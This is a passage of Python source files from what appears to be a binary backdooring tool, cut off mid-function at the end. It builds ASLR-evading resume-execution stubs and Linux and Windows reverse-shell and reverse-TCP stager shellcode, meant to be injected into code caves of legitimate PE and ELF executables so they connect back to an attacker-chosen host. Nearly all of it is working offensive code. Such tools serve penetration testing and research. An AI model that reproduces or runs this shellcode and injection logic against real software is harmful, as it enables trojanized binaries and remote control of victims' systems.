                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<I", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 3:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 2:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<H", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 1:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<B", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 0:
                resumeExe += self.opcode_return(OpCode, instr_length)
                ReturnTrackingAddress = item[3]

        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_you  # zero out r15
        resumeExe += "\x49\x81\xe7"
        resumeExe += self.compliment_me  # zero out r15
        resumeExe += "\x49\x81\xc7"  # ADD r15 <<-fix it this a 4 or 8 byte add does it matter?
        if ReturnTrackingAddress >= 4294967295:
            resumeExe += struct.pack('<Q', ReturnTrackingAddress)
        else:
            resumeExe += struct.pack('<I', ReturnTrackingAddress)
        resumeExe += "\x41\x57"  # push r15
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_you
        resumeExe += "\x49\x81\xe7"  # zero out r15
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe


    def resume_execution_32(self):
        """
        This section of code imports the self.flItms['ImpList'] from pe32_entry_instr
        to patch the executable after shellcode execution
        """
        verbose = False
        print "[*] Creating win32 resume execution stub"
        resumeExe = ''
        for item in self.flItms['ImpList']:
            OpCode_address = item[0]
            OpCode = item[1].keys()[0]
            instruction = item[1].values()[0]
            ImpValue = item[2]
            instr_length = item[4]
            if verbose is True:
                if instruction:
                    print 'instruction', hex(instruction)
                else:
                    print "single opcode, no instruction"

            self.ones_compliment()

            if OpCode == int('e8', 16):  # Call instruction
                # Let's beat ASLR :D
                resumeExe += "\xb8"
                if self.flItms['LastCaveAddress'] == 0:
                    self.flItms['LastCaveAddress'] = self.flItms['JMPtoCodeAddress']
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     #The last cave starting point
                                     #self.flItms['JMPtoCodeAddress'] +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     500 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x12"  # JA (14)
                resumeExe += "\x83\xC1\x15"  # ADD ECX, 15
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..
                call_addr = (self.flItms['VrtStrtngPnt'] +
                             instruction)

                if call_addr > 4294967295:
                    resumeExe += struct.pack('<I', call_addr - 0xffffffff - 1)
                else:
                    resumeExe += struct.pack('<I', call_addr)
                resumeExe += "\xff\xe0"  # JMP EAX
                resumeExe += "\xb8"  # ADD
                resumeExe += struct.pack('<I', item[3])
                resumeExe += "\x50\xc3"  # PUSH EAX,RETN
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                #had to add - 5 to this below
                resumeExe += struct.pack("<I", self.flItms['VrtStrtngPnt'] - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                resumeExe += struct.pack('<I', item[3])
                resumeExe += "\x50"
                resumeExe += "\x05"
                resumeExe += struct.pack('<I', instruction)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif OpCode in self.jump_codes:
                #Let's beat ASLR
                resumeExe += "\xb8"
                aprox_loc_wo_alsr = (self.flItms['VrtStrtngPnt'] +
                                     #self.flItms['JMPtoCodeAddress'] +
                                     self.flItms['LastCaveAddress'] +
                                     len(self.flItms['shellcode']) + len(resumeExe) +
                                     200 + self.flItms['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += "\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += "\x2b\xc1"  # sub eax,ecx
                resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += "\x77\x0b"  # JA (14)
                resumeExe += "\x83\xC1\x16"
                resumeExe += "\x51"
                resumeExe += "\xb8"  # Mov EAX ..

                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX,CallV
                resumeExe += "\x50\xc3"
                resumeExe += "\x8b\xf0"
                resumeExe += "\x8b\xc2"
                resumeExe += "\xb9"
                resumeExe += struct.pack('<I', self.flItms['VrtStrtngPnt'] - 5)
                resumeExe += "\x2b\xc1"
                resumeExe += "\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', ImpValue)
                elif ImpValue > 429467295:
                    resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', ImpValue - 2)
                resumeExe += "\x50"
                resumeExe += "\x33\xc9"
                resumeExe += "\x8b\xc6"
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_you
                resumeExe += "\x81\xe6"
                resumeExe += self.compliment_me
                resumeExe += "\xc3"
                ReturnTrackingAddress = item[3]
                return ReturnTrackingAddress, resumeExe

            elif instr_length == 7:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 6:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 5:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBBBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 4:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<I", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 3:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<BBB", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 2:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<H", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 1:
                resumeExe += self.opcode_return(OpCode, instr_length)
                resumeExe += struct.pack("<B", instruction)
                ReturnTrackingAddress = item[3]

            elif instr_length == 0:
                resumeExe += self.opcode_return(OpCode, instr_length)
                ReturnTrackingAddress = item[3]

        resumeExe += "\x25"
        resumeExe += self.compliment_you  # zero out EAX
        resumeExe += "\x25"
        resumeExe += self.compliment_me  # zero out EAX
        resumeExe += "\x05"  # ADD
        resumeExe += struct.pack('=i', ReturnTrackingAddress)
        resumeExe += "\x50"  # push eax
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_you
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe

    
########NEW FILE########
__FILENAME__ = intelmodules
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

def eat_code_caves(flItms, caveone, cavetwo):
    try:
        if flItms['CavesPicked'][cavetwo][0] == flItms['CavesPicked'][caveone][0]:
            return int(flItms['CavesPicked'][cavetwo][1], 16) - int(flItms['CavesPicked'][caveone][1], 16)
        else:
            caveone_found = False
            cavetwo_found = False
            forward = True
            windows_memoffset_holder = 0
            for section in flItms['Sections']:
                if flItms['CavesPicked'][caveone][0] == section[0] and caveone_found is False:
                    caveone_found = True
                    if cavetwo_found is False:
                        windows_memoffset_holder += section[1] + 4096 - section[1] % 4096 - section[3]
                        forward = True
                        continue
                    if section[1] % 4096 == 0:
                        continue
                    break

                if flItms['CavesPicked'][cavetwo][0] == section[0] and cavetwo_found is False:
                    cavetwo_found = True
                    if caveone_found is False:
                        windows_memoffset_holder += -(section[1] + 4096 - section[1] % 4096 - section[3])
                        forward = False
                        continue
                    if section[1] % 4096 == 0:
                        continue
                    break

                if caveone_found is True or cavetwo_found is True:
                    if section[1] % 4096 == 0:
                            continue
                    if forward is True:
                        windows_memoffset_holder += section[1] + 4096 - section[1] % 4096 - section[3]
                    if forward is False:
                        windows_memoffset_holder += -(section[1] + 4096 - section[1] % 4096 - section[3])
                    continue

                #Need a way to catch all the sections in between other sections

            return int(flItms['CavesPicked'][cavetwo][1], 16) - int(flItms['CavesPicked'][caveone][1], 16) + windows_memoffset_holder

    except Exception as e:
        #print "EAT CODE CAVE", str(e)
        return 0
########NEW FILE########
__FILENAME__ = LinuxIntelELF32
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import struct
import sys

class linux_elfI32_shellcode():
    """
    Linux ELFIntel x32 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"


    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, CavesPicked={}):
        """
        Modified metasploit linux/x64/shell_reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
       
       
        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
        "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68")
        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x68\x02\x00"
        #PORT
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
        "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
        "\x52\x53\x89\xe1\xb0\x0b\xcd\x80")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
        "\x97\x5b\x68")
        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x68\x02\x00"
        #PORT
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += ("\x89\xe1\x6a"
                "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
                "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
                "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, CavesPicked={}):
        """
        For user with position independent shellcode from the user
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()


        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode1 += "\xbd"
        self.shellcode1 += struct.pack("<I", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)

########NEW FILE########
__FILENAME__ = LinuxIntelELF64
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import struct
import sys

class linux_elfI64_shellcode():
    """
    ELF Intel x64 shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""

        

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit linux/x64/shell_reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 +=struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
                        "\x48\x97\x48\xb9\x02\x00")
                        #\x22\xb8"
                        #"\x7f\x00\x00\x01
        self.shellcode1 += struct.pack("!H", self.PORT)
                        #HOST
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89"
                        "\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
                        "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62"
                        "\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
                        "\x0f\x05")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        
        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 +=struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += ("\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
                            "\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a"
                            "\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00")
        self.shellcode1 += struct.pack("!H", self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
                            "\x05\x59\x5e\x5a\x0f\x05\xff\xe6")

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit linux/x64/shell/reverse_tcp shellcode
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #64bit shellcode
        self.shellcode1 = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c" 
        self.shellcode1 += "\x48\xBD"
        self.shellcode1 += struct.pack("<Q", self.e_entry)
        self.shellcode1 += "\xff\xe5"
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)



########NEW FILE########
__FILENAME__ = WinIntelPE32
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''


##########################################################
#               BEGIN win32 shellcodes                   #
##########################################################
import sys
import struct
from intelmodules import eat_code_caves

class winI32_shellcode():
    """
    Windows Intel x32 shellcode class
    """

    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.shellcode = ""
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_tcp_stager(self, flItms, CavesPicked={}):
        """
        Reverse tcp stager. Can be used with windows/shell/reverse_tcp or
        windows/meterpreter/reverse_tcp payloads from metasploit.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        flItms['stager'] = True

        breakupvar = eat_code_caves(flItms, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE\x22\x01\x00\x00"  # <---Size of shellcode2 in hex
                           "\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                           "\x89\xF1"
                           )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xE9\x27\x01\x00\x00"

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"
        #Can inject any shellcode below.

        self.shellcode2 += ("\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52"
                            "\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC"
                            "\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B"
                            "\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0"
                            "\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01"
                            "\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03"
                            "\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C"
                            "\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B"
                            "\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68"
                            "\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF"
                            "\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF"
                            "\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5"
                            "\x97\x6A\x05\x68"
                            )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += ("\x89\xE6\x6A"
                            "\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E"
                            "\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57"
                            "\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00"
                            "\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53"
                            "\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def cave_miner(self, flItms, CavesPicked={}):
        """
        Sample code for finding sutable code caves
        """
        breakupvar = eat_code_caves(flItms, 0, 1)
        self.shellcode1 = ""

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        #else:
        #    self.shellcode1 += "\x89\x00\x00\x00"

        self.shellcode1 += ("\x90"*40
                            )

        self.shellcode2 = ("\x90" *48
                           )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)
    

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        This module allows for the user to provide a win32 raw/binary
        shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
        """

        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
